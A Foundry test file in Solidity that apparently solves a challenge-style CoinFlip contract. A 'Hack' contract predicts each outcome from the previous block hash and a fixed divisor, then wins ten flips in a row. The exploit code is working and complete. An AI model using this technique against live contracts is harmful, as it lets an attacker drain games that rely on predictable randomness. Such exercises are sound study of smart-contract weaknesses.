// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test , console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipTest is Test {

    CoinFlip flip;

    Hack hack;

    address player = makeAddr("PL");
    function setUp() public {

        flip = new CoinFlip();
        hack = new Hack(flip);

    }

    function testGuesstheCorrectOutCome() public {


        for(uint256 i=1 ; i< 11 ;i++){

            vm.roll(block.number + i);

            hack.attack();
        }
    
        assert(flip.consecutiveWins() == 10);

    }


}

contract Hack {

    CoinFlip  flip;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(CoinFlip _flip) {

        flip = _flip;

    }

    function gusses() public returns(bool){

        uint256 blockValue = uint256(blockhash(block.number - 1));
       
        uint256 coinFlip = blockValue / FACTOR; 

        bool side = coinFlip == 1 ? true : false; 

        return side;
    }
    
    function attack() public {

        bool guess = gusses();

        flip.flip(guess);
    }
    
}

